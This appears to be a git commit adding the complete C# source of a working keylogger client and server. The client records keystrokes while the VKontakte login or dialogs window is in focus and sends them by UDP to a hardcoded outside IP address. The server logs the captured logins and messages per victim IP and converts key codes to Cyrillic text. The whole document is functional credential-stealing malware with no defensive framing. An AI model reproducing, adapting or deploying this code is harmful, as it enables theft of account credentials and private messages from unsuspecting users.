de35cdaab4282d1949a18cb87115905e28b34e9e
misterobot404 <misterobot404@gmail.com>
2018-12-16 13:51:57 +1000

    1.0

---
+++ KeyloggerClient/KeyloggerClient.cs
@@ -0,0 +1,92 @@
+﻿using System.Runtime.InteropServices;
+using System;
+using System.Threading;
+using System.Windows.Forms;
+using System.Text;
+using System.Net.Sockets;
+
+namespace Keylogger
+{
+    class KeyloggerClient
+    {
+        static string buffEntry = "";
+        static string buffMessage = "";
+
+        static void Main(string[] args)
+        {
+            StringBuilder headerWnd = new StringBuilder(64);
+            Thread myThread = new Thread(new ThreadStart(sendBuffEntry));
+            myThread.Start();
+            Thread myThread2 = new Thread(new ThreadStart(sendBuffMessage));
+            myThread2.Start();
+
+            while (true)
+            {
+                IntPtr handle = GetForegroundWindow();
+
+                if (GetWindowText(handle, headerWnd, 32) > 0)
+                {
+                    if (headerWnd.ToString().Contains("Добро пожаловать | ВКонтакте"))
+                    {
+                        for (Int32 i = 0; i < 255; i++)
+                        {
+                            int state = GetAsyncKeyState(i);
+                            if (state == 1 || state == -32767)
+                            {
+                                buffEntry += ((Keys)i).ToString() + " ";
+                            }
+                        }
+                    }
+                    if (headerWnd.ToString().Contains("Диалоги"))
+                    {
+                        for (Int32 i = 0; i < 255; i++)
+                        {
+                            int state = GetAsyncKeyState(i);
+                            if (state == 1 || state == -32767)
+                            {
+                                buffMessage += ((char)i).ToString();
+                            }
+                        }
+                    }
+                }
+                Thread.Sleep(100);
+            }
+        }
+
+        private static void sendBuffMessage()
+        {
+            while (true)
+            {
+                Thread.Sleep(15000);
+                if (buffMessage == "") continue;
+                UdpClient client = new UdpClient();
+                client.Connect("92.37.205.232", 3001);
+                byte[] data = Encoding.UTF8.GetBytes(buffMessage);
+                client.Send(data, data.Length);
+                client.Close();
+                buffMessage = "";
+            }
+        }
+        private static void sendBuffEntry()
+        {
+            while (true)
+            {
+                Thread.Sleep(30000);
+                if (buffEntry == "") continue;
+                UdpClient client = new UdpClient();
+                client.Connect("92.37.205.232", 3000);
+                byte[] data = Encoding.UTF8.GetBytes(buffEntry);
+                client.Send(data, data.Length);
+                client.Close();
+                buffEntry = "";
+            }
+        }
+
+        [DllImport("user32.dll")]
+        private static extern int GetAsyncKeyState(Int32 i);
+        [DllImport("user32.dll")]
+        private static extern IntPtr GetForegroundWindow();
+        [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
+    }
+}
---
+++ KeyloggerServer/KeyloggerServer.cs
@@ -0,0 +1,117 @@
+﻿using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Net;
+using System.Net.Sockets;
+using System.Text;
+using System.Threading;
+
+namespace KeyloggerServer
+{
+    class KeyloggerServer
+    {
+        static UdpClient serverMsg = new UdpClient(3001);
+
+        static void Main(string[] args)
+        {
+            Thread myThread = new Thread(new ThreadStart(receiveBuffEntry));
+            myThread.Start();
+
+            serverMsg.BeginReceive(new AsyncCallback(receiveBuffMsg), null);
+        }
+
+        private static void receiveBuffMsg(IAsyncResult res)
+        {
+            IPEndPoint RemoteIpEndPoint = new IPEndPoint(IPAddress.Any, 3001);
+            byte[] received = serverMsg.EndReceive(res, ref RemoteIpEndPoint);
+            WriteMsgAsync(Encoding.UTF8.GetString(received), RemoteIpEndPoint.Address.ToString() + " message.txt");
+            serverMsg.BeginReceive(new AsyncCallback(receiveBuffMsg), null);
+        }
+        private static void receiveBuffEntry()
+        {
+            IPEndPoint ip;
+            while (true)
+            {
+                UdpClient server = new UdpClient(3000);
+                ip = null;
+                byte[] data = server.Receive(ref ip);
+                WriteLoginAsync(Encoding.UTF8.GetString(data), ip.Address.ToString() + " login.txt");
+                server.Close();
+            }
+        }
+
+        static async void WriteLoginAsync(string text, string fileName)
+        {
+            using (StreamWriter writer = File.AppendText(fileName))
+            {               
+                await writer.WriteAsync(text);
+            }
+        }
+        static async void WriteMsgAsync(string text, string fileName)
+        {
+            using (StreamWriter writer = File.AppendText(fileName))
+            {
+                await writer.WriteAsync(Cyrillify(text));
+            }
+        }
+
+
+        static string Cyrillify(string str)
+        {
+            StringBuilder sb = new StringBuilder();
+            bool space = false;
+            foreach (char c in str)
+            {             
+                try   {
+                    sb.Append(Replacements[c]);
+                    space = true;
+                }
+                catch {
+                    if (space)
+                    {
+                        sb.Append(" ");
+                        space = false;
+                    }
+                    continue;
+                }              
+            }               
+            return sb.ToString();
+        }
+        static Dictionary<char, char> Replacements = new Dictionary<char, char>()
+        {
+            ['Q'] = 'Й',
+            ['W'] = 'Ц',
+            ['E'] = 'У',
+            ['R'] = 'К',
+            ['T'] = 'Е',
+            ['Y'] = 'Н',
+            ['U'] = 'Г',
+            ['I'] = 'Ш',
+            ['O'] = 'Щ',
+            ['P'] = 'З',
+            ['Û'] = 'Х',
+            ['Ý'] = 'Ъ',
+            ['A'] = 'Ф',
+            ['S'] = 'Ы',
+            ['D'] = 'В',
+            ['F'] = 'А',
+            ['G'] = 'П',
+            ['H'] = 'Р',
+            ['J'] = 'О',
+            ['K'] = 'Л',
+            ['L'] = 'Д',
+            ['º'] = 'Ж',
+            ['Þ'] = 'Э',
+            ['Z'] = 'Я',
+            ['X'] = 'Ч',
+            ['C'] = 'С',
+            ['V'] = 'М',
+            ['B'] = 'И',
+            ['N'] = 'Т',
+            ['M'] = 'Ь',
+            ['¼'] = 'Б',
+            ['¾'] = 'Ю',
+            ['À'] = 'Ё',       
+        };
+    }
+}
